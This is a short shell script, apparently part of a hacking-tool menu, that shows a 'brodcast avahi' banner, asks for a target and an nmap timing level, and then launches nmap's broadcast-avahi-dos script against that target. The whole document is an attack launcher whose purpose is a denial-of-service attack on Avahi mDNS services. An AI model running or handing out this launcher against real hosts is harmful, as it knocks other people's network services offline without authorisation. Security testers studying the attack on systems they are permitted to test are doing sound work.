figlet brodcast avahi
echo " "
echo "levels: [0, 1, 2, 3, 4, 5]"
read -p "Target: " t
read -p "level: " l
nmap -T$l --script broadcast-avahi-dos $t
